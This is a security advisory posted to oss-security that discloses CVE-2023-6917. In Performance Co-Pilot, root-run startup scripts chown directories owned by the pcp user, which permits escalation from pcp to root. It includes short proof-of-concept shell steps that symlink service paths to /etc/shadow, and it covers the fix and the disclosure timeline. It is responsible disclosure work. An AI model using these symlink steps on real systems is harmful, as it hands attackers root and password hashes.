@@ -1,0 +1,166 @@
+
+Date: Wed, 28 Feb 2024 12:33:19 +0100
+From: Matthias Gerstner <mgerstner@...e.de>
+To: oss-security@...ts.openwall.com
+Subject: Performance Co-Pilot (pcp): Unsafe use of Directories in
+ /var/lib/pcp and /var/log/pcp breaks pcp Service User Isolation
+ (CVE-2023-6917)
+
+Hello list,
+
+this report is about a local pcp to root user exploit in the PCP
+performance analysis toolkit. You can also find a rendered HTML version
+of this report on our blog [1].
+
+1) Introduction
+===============
+
+Performance Co-Pilot (pcp) [2] is a performance analysis toolkit
+that allows to gather and evaluate data on a local system and also share this
+data over the network in a distributed manner.
+
+During routine reviews we noticed issues in pcp on Linux with directory
+permissions that allow to locally escalate privileges from the _pcp_ service
+user to _root_.
+
+These findings are based on the 5.3.7 version release of pcp. CVE-2023-6917
+has been assigned for this class of issues in pcp.
+
+2) Service User And Directory Permissions
+=========================================
+
+The systemd services shipped with pcp run with mixed privileges. Some use only
+limited _pcp_ user/group privileges, like "pmie_check.service". Others like
+"pmcd.service" run with full root privileges. The `pmcd` daemon implements the
+networking logic of pcp. It drops privileges from _root_ to _pcp_ during
+startup.
+
+The different pcp programs use a shared directory structure:
+
+- /var/lib/pcp/tmp owned by `pcp:pcp` mode `0775`
+- /var/log/pcp     owned by `pcp:pcp` mode `0775`
+
+When privileged processes running as _root_ access files in directories or
+directory trees controlled by unprivileged users, then easily security issues
+can result from this. For the directories listed above, we quickly found the
+two exploitable issues that are described in the following sections.
+
+3a) Startup Script for `pmcd` runs chown for `$PCP_TMP_DIR/pmlogger`
+====================================================================
+
+The "pmcd.service" runs with root privileges and executes the bash script
+"/usr/libexec/pcp/lib/pmcd" (named "rc_pmcd" in the Git source repository).
+Within this script the following code [5] runs as part of the
+start routine, found in function `_reboot_setup()`:
+
+     if [ ! -d "$PCP_TMP_DIR/pmlogger" ]
+     then
+         mkdir -p -m 775 "$PCP_TMP_DIR/pmlogger"
+         chown $PCP_USER:$PCP_GROUP "$PCP_TMP_DIR/pmlogger"
+         if which restorecon >/dev/null 2>&1
+         then
+             restorecon -r "$PCP_TMP_DIR"
+         fi
+     else
+
+`$PCP_TMP_DIR` in this context refers to "/var/lib/pcp/tmp", owned by `pcp:pcp`
+mode `0775`. Since the shell code above does not exit on errors, a compromised pcp
+user doesn't even have to win a race condition to perform a symlink attack.
+The following exploit works:
+
+    # simulate a compromised pcp user
+    root # sudo -u pcp -g pcp bash
+    pcp  $ cd /var/lib/pcp/tmp
+    pcp  $ rm -r pmlogger
+    pcp  $ ln -s /etc/shadow pmlogger
+    pcp  $ exit
+    root # systemctl start pcmd.service
+    root # ls -l /etc/shadow
+    -rw-r----- 1 pcp pcp 1.2K Dec  7 15:47 /etc/shadow
+
+3b) Startup Script for `pmproxy` runs chown in `$RUN_DIR`
+=========================================================
+
+The "pmproxy.service" runs with root privileges and executes the bash script
+"/usr/libexec/pcp/lib/pmproxy" (named `rc_pmproxy` in the Git source
+repository). Within this script the following code [6] runs as
+part of the start (and other) routines:
+
+    # create directory which will serve as cwd
+    if [ ! -d "$RUNDIR" ]
+    then
+        mkdir -p -m 775 "$RUNDIR"
+        chown $PCP_USER:$PCP_GROUP "$RUNDIR"
+    fi
+
+`$RUN_DIR` in this context refers to "/var/log/pcp/pmproxy". "/var/log/pcp" is
+owned by `pcp:pcp` mode `0775`. Similar to the exploit described in section
+3a), no race condition has to be won to exploit this:
+
+    # simulate a compromised pcp user
+    root # sudo -u pcp -g pcp bash
+    pcp  $ cd /var/log/pcp
+    pcp  $ rm -rf pmproxy
+    pcp  $ ln -s /etc/shadow pmproxy
+    pcp  $ exit
+    root # systemctl start pmproxy.service
+    root # ls -l /etc/shadow
+    -rw-r----- 1 pcp pcp 1.2K Dec  7 15:47 /etc/shadow
+
+4) Summary
+==========
+
+We only picked two of the more obvious security issues that result from _root_
+processes operating on these pcp owned directories. There are likely more
+issues of the same class lingering in the pcp scripts that run as _root_. Given
+this, the user separation of _pcp_ can be considered nonexistent in its
+current form, and the _pcp_ user should be treated equal to _root_.
+
+The _pcp_ service user is also used for the network facing `pmcd` component,
+thus these issues strongly impact defense in depth for pcp, for the scenario
+when an attacker finds a way to exploit the network daemon.
+
+5) Bugfix
+=========
+
+Upstream performed a wider redesign of the privilege separation handling in
+pcp components. The pull request [3] corresponding to this contains a
+large number of commits. It is difficult to isolate any simple patches
+from that.
+
+In our Bugzilla bug [4] that tracks this issue, I attempted to identify
+the subset of commits relevant to this issue, to help with backporting.
+
+6) Timeline
+===========
+
+2023-12-13: I reported the findings to pcp-maintainers@...ups.io offering coordinated disclosure.
+2023-12-14: The Red Hat Security Team was added to the discussion.
+2023-12-15: After some initial disagreement whether this qualifies as an actual security issue, an agreement was found that it is a change of security scope and deserves a CVE assignment.
+2023-12-15: An upstream author suggested mid of February as a publication date, for which time a release for pcp had been planned anyway.
+2023-12-18: Red Hat Security assigned CVE-2023-6917 to track the issue(s).
+2024-01-01: Upstream discussed some initial changes to address the issue(s) in the mail thread and I tried to give some feedback about them.
+2024-02-20: Communication about the publication process died down, and I learned from our packager that the Pull Request [3] containing the fixes had already been public for some time. It seems no clear embargo had been established for the coordinated release, there had been contradicting statements.
+2024-02-27: After verifying with the upstream authors that publication is okay I finalized my report and published all information.
+
+7) References
+=============
+
+[1]: https://security.opensuse.org/2024/02/27/pcp-user-to-root-exploit.html
+[2]: https://pcp.io
+[3]: https://github.com/performancecopilot/pcp/pull/1873
+[4]: https://bugzilla.suse.com/show_bug.cgi?id=1217826#c24
+[5]: https://github.com/performancecopilot/pcp/blob/5.3.7/src/pmcd/rc_pmcd#L134
+[6]: https://github.com/performancecopilot/pcp/blob/5.3.7/src/pmproxy/rc_pmproxy#L264
+
+-- 
+Matthias Gerstner <matthias.gerstner@...e.de>
+Security Engineer
+https://www.suse.com/security
+GPG Key ID: 0x14C405C971923553
+ 
+SUSE Software Solutions Germany GmbH
+HRB 36809, AG Nürnberg
+Geschäftsführer: Ivo Totev, Andrew McDonald, Werner Knoblich
+
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
